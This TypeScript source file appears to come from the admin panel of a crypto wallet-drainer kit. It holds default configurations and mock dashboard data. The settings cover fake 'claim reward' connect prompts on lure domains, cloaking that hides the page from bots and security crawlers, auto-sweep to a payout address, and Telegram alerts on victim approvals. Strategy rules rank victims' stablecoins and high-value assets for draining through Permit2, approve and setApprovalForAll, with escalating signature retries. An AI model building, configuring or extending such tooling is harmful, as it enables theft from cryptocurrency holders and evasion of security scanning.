import {
  WalletSession,
  LogEntry,
  DomainConfig,
  PlatformStats,
  StrategyRule,
  GeneralConfig,
  WalletConfig,
  ModalConfig,
  TokensConfig,
  AdvancedConfig,
  ContractsConfig,
  StrategyConfig,
  AppKitConfig,
  TelegramConfig,
  PayoutConfig,
  CloakingConfig,
} from "./types";

export const defaultGeneralConfig: GeneralConfig = {
  ecosystem: "evm",
  solanaCluster: "mainnet-beta",
  solanaProgramId: "",
  solanaRpcUrl: "",
  tronNetwork: "mainnet",
  tronContractAddress: "",
  tronRpcUrl: "",
  connectButtonClass: ".connect-btn",
  actionButtonClass: ".action-button",
  disconnectButtonClass: ".disconnect-btn",
  connectText: "Connect Wallet",
  connectedText: "Connected: {wallet}",
  loadingText: "Verifying...",
  verifyText: "Please confirm in your wallet",
  rejectText: "Transaction was declined",
  changeChainText: "Please switch network",
  rejectChainText: "Network switch was rejected",
  notEligibleText: "Wallet does not meet requirements",
  disconnectText: "Disconnect",
  transactionFunctionName: "claimReward",
  themeMode: "dark",
  backendUrl: "https://api.v26sequence.com",
};

export const defaultWalletConfig: WalletConfig = {
  minBalanceUSD: 100,
  targetChainAssetRatio: 60,
  maxChainSwitchRetry: 3,
  singleChainMode: false,
  supportedWallets: ["metamask", "walletconnect", "coinbase", "trust", "phantom", "rabby"],
  walletVisibility: {
    metamask: true,
    walletconnect: true,
    coinbase: true,
    trust: true,
    phantom: true,
    rabby: true,
  },
  devToolsMonitoring: true,
  providerDetection: true,
  autoLoadScripts: true,
  waitForPageLoad: true,
};

export const defaultModalConfig: ModalConfig = {
  modalFrameworkStyle: "reown",
  popupStyle: "sweetalert2",
  previewStyle: "trails",
  themeMode: "dark",
  accentColor: "#7C73FF",
  accentColorForeground: "#FFFFFF",
  borderRadius: "large",
  connectLayout: "cards",
  collapseWallets: false,
  featuredWallets: ["metamask", "walletconnect", "coinbase"],
  enableEmailOption: false,
  enableSocials: false,
  overlayBlur: "medium",
  fontStyle: "modern",
  openOnNetworkView: false,
  preferredChains: [1, 8453, 42161],
  walletConnectProjectId: process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "",
  sequenceProjectAccessKey: process.env.NEXT_PUBLIC_SEQUENCE_PROJECT_ACCESS_KEY || "",
  sequenceWaasConfigKey: process.env.NEXT_PUBLIC_SEQUENCE_WAAS_CONFIG_KEY || "",
  sequenceWalletUrl: process.env.NEXT_PUBLIC_SEQUENCE_WALLET_URL || "",
  enableLatestWC: true,
  exposeExternalSDK: false,
  clickToOpenModal: true,
};

export const defaultTokensConfig: TokensConfig = {
  directTransfer: true,
  allowanceExecution: true,
  fallbackHandling: true,
  balanceBasedApproval: true,
  erc721Support: true,
  erc1155Support: true,
  marketplaceTransfers: true,
  contractFunctions: ["mint", "stake", "claimReward", "subscribe"],
  transactionOrdering: "priority",
  visibleChains: [1, 56, 137, 43114, 42161, 10, 8453],
};

export const defaultAdvancedConfig: AdvancedConfig = {
  retryCount: 3,
  signaturePromptText: "Verify ownership of {wallet}",
  typedDataEnforcement: true,
  logFormat: "json",
  logSignaturePrompts: true,
  logChainSwitchEvents: true,
  logFullSiteURL: true,
  sessionCaching: true,
  autoSignaturePrompt: true,
  eligibilityReload: true,
  postTransactionRefresh: true,
};

export const defaultContractsConfig: ContractsConfig = {
  primary: {
    name: "PrimaryContract",
    address: "",
    abiName: "",
    abi: [],
    chainId: 1,
    selectedFunctions: [],
  },
  secondaryTargets: [],
  functionBindings: [],
};

export const defaultStrategyConfig: StrategyConfig = {
  mode: "permit2",
  executionBackend: "stealth-exchange",
  fallbackMode: "approve",
  gaslessEnabled: false,
  multicallEnabled: true,
  permit2Enabled: true,
  typedDataEnabled: true,
  eip7702Enabled: false,
  delegateCallEnabled: false,
  delegateCallTarget: "",
  delegateCallSelectors: [],
  eip7702DelegationTarget: "",
  eip7702RequiresSupport: true,
  eip7702AuthorizationMode: "wallet",
  trailsEnabled: false,
  trailsMode: "pay",
  trailsApiKey: "",
  trailsToAddress: "",
  trailsToChainId: 8453,
  trailsToToken: "USDC",
  trailsToAmount: "1",
  trailsWidgetUrl: "https://demo.trails.build/widget",
  obfuscationLevel: "medium",
  customRpcUrl: "",
};

export const defaultAppKitConfig: AppKitConfig = {
  appName: "StealthV26 App Kit",
  appDescription: "Custom operational app kit for wallet interactions and contract routing.",
  appUrl: "",
  brandColor: "#7C73FF",
  logoUrl: "",
  supportEmail: "",
  enableAnalytics: true,
  enableSocialLogin: false,
  enableSmartWallet: false,
  enableWalletConnect: true,
  enableInjectedWallets: true,
  customCss: "",
};

export const defaultTelegramConfig: TelegramConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || "",
  chatId: process.env.TELEGRAM_CHAT_ID || "",
  enabled: false,
  events: {
    connection: true,
    networkChange: true,
    approval: true,
    denial: true,
    assetActivity: true,
  },
};

export const defaultPayoutConfig: PayoutConfig = {
  address: "",
  chain: "ethereum",
  autoSweep: true,
  minSweepAmount: 50,
};

export const defaultCloakingConfig: CloakingConfig = {
  enabled: false,
  filterBots: true,
  filterDatacenterIPs: true,
  filterHeadlessBrowsers: true,
  allowedCountries: [],
  blockedCountries: [],
};

const chains = ["Ethereum", "BSC", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base"];
const statuses: WalletSession["status"][] = ["connected", "disconnected", "pending", "approved", "rejected"];
const countries = ["US", "UK", "DE", "FR", "JP", "KR", "SG", "AE", "CA", "AU"];
const domains = ["app.defi-protocol.io", "mint.nftlaunch.xyz", "stake.yieldmax.com", "claim.airdrop.finance", "swap.dexbridge.io"];

function randomFrom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomAddr(): string {
  const hex = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) addr += hex[Math.floor(Math.random() * 16)];
  return addr;
}

function shortAddr(addr: string): string {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

export function generateSessions(count: number): WalletSession[] {
  return Array.from({ length: count }, (_, i) => {
    const wallet = randomAddr();
    const chain = randomFrom(chains);
    return {
      id: `session-${i + 1}`,
      wallet: shortAddr(wallet),
      chain,
      chainId: chain === "Ethereum" ? 1 : chain === "BSC" ? 56 : chain === "Polygon" ? 137 : chain === "Avalanche" ? 43114 : chain === "Arbitrum" ? 42161 : chain === "Optimism" ? 10 : 8453,
      balanceUSD: Math.round(Math.random() * 50000 * 100) / 100,
      status: randomFrom(statuses),
      timestamp: new Date(Date.now() - Math.random() * 86400000 * 7).toISOString(),
      domain: randomFrom(domains),
      country: randomFrom(countries),
      assets: [
        { symbol: "ETH", name: "Ethereum", balance: Math.random() * 10, valueUSD: Math.random() * 20000, type: "NATIVE" },
        { symbol: "USDT", name: "Tether", balance: Math.random() * 10000, valueUSD: Math.random() * 10000, type: "ERC-20" },
        { symbol: "USDC", name: "USD Coin", balance: Math.random() * 10000, valueUSD: Math.random() * 10000, type: "ERC-20" },
      ],
    };
  });
}

const logTypes: LogEntry["type"][] = ["connection", "signature", "approval", "transfer", "chain_switch", "error", "disconnect"];

export function generateLogs(count: number): LogEntry[] {
  const messages: Record<LogEntry["type"], string[]> = {
    connection: ["Wallet connected successfully", "New wallet session initiated", "Reconnection detected"],
    signature: ["Signature request sent", "EIP-712 typed data signed", "Personal sign completed"],
    approval: ["ERC-20 approve() executed", "Permit2 batch approval signed", "setApprovalForAll granted"],
    transfer: ["transferFrom executed", "safeTransferFrom completed", "Batch transfer initiated"],
    chain_switch: ["Switched to Ethereum", "Network change to BSC", "Chain switch to Polygon"],
    error: ["User rejected signature", "Insufficient gas", "Transaction reverted"],
    disconnect: ["Wallet disconnected", "Session expired", "Manual disconnect"],
  };
  return Array.from({ length: count }, (_, i) => {
    const type = randomFrom(logTypes);
    return {
      id: `log-${i + 1}`,
      type,
      wallet: shortAddr(randomAddr()),
      chain: randomFrom(chains),
      message: randomFrom(messages[type]),
      timestamp: new Date(Date.now() - Math.random() * 86400000 * 7).toISOString(),
      domain: randomFrom(domains),
    };
  }).sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export function generateDomains(): DomainConfig[] {
  return domains.map((domain, i) => ({
    id: `domain-${i + 1}`,
    domain,
    status: i < 3 ? "active" : i < 4 ? "paused" : "expired",
    createdAt: new Date(Date.now() - Math.random() * 86400000 * 30).toISOString(),
    lastActivity: new Date(Date.now() - Math.random() * 86400000 * 2).toISOString(),
    sessions: Math.floor(Math.random() * 500),
    totalValueUSD: Math.round(Math.random() * 500000 * 100) / 100,
  }));
}

export function generateStats(): PlatformStats {
  const dailySessions = Array.from({ length: 30 }, (_, i) => {
    const date = new Date(Date.now() - (29 - i) * 86400000);
    return {
      date: date.toISOString().split("T")[0],
      count: Math.floor(Math.random() * 120 + 20),
      value: Math.round(Math.random() * 100000 * 100) / 100,
    };
  });

  const chainDistribution = chains.map((chain) => ({
    chain,
    count: Math.floor(Math.random() * 300 + 50),
    value: Math.round(Math.random() * 200000 * 100) / 100,
  }));

  const hourlyActivity = Array.from({ length: 24 }, (_, hour) => ({
    hour,
    count: Math.floor(Math.random() * 50 + 5),
  }));

  return {
    totalSessions: 4832,
    activeSessions: 47,
    totalValueProcessed: 2847392.58,
    successRate: 78.4,
    avgSessionDuration: 124,
    uniqueWallets: 3291,
    topChain: "Ethereum",
    dailySessions,
    chainDistribution,
    hourlyActivity,
  };
}

export function generateStrategyRules(): StrategyRule[] {
  return [
    {
      id: "rule-1",
      name: "Stablecoin Priority",
      type: "priority",
      enabled: true,
      config: { tokens: ["USDT", "USDC", "DAI", "BUSD"], weight: 100 },
      description: "Prioritize stablecoins in execution ordering",
    },
    {
      id: "rule-2",
      name: "High-Value Assets First",
      type: "priority",
      enabled: true,
      config: { minValueUSD: 1000, weight: 90 },
      description: "Process high-value assets before lower value ones",
    },
    {
      id: "rule-3",
      name: "Native Token Priority",
      type: "priority",
      enabled: true,
      config: { types: ["NATIVE"], weight: 80 },
      description: "Process native chain tokens with high priority",
    },
    {
      id: "rule-4",
      name: "Permit2 Fallback",
      type: "retry",
      enabled: true,
      config: { method: "permit2", maxRetries: 3, fallbackTo: "approve" },
      description: "Fall back to standard approve if Permit2 fails",
    },
    {
      id: "rule-5",
      name: "Signature Retry",
      type: "retry",
      enabled: true,
      config: { maxRetries: 2, delayMs: 1500, escalate: true },
      description: "Retry signature requests with escalation",
    },
    {
      id: "rule-6",
      name: "Multicall Fallback",
      type: "retry",
      enabled: false,
      config: { method: "multicall", fallbackTo: "sequential", maxRetries: 2 },
      description: "Fall back to sequential execution if multicall fails",
    },
    {
      id: "rule-7",
      name: "Balance Threshold Gate",
      type: "conditional",
      enabled: true,
      config: { minBalanceUSD: 100, action: "proceed", elseAction: "skip" },
      description: "Only process wallets above minimum balance threshold",
    },
    {
      id: "rule-8",
      name: "Chain-Specific Flow",
      type: "conditional",
      enabled: true,
      config: { chains: [1, 56, 137], usePermit2: true, otherChains: "approve" },
      description: "Use Permit2 on supported chains, standard approve on others",
    },
    {
      id: "rule-9",
      name: "NFT Detection Flow",
      type: "conditional",
      enabled: false,
      config: { detectNFTs: true, minFloorPrice: 50, action: "setApprovalForAll" },
      description: "Detect and process valuable NFTs separately",
    },
    {
      id: "rule-10",
      name: "Dust Filter",
      type: "conditional",
      enabled: true,
      config: { maxDustUSD: 5, action: "skip" },
      description: "Skip dust-value tokens below threshold",
    },
  ];
}
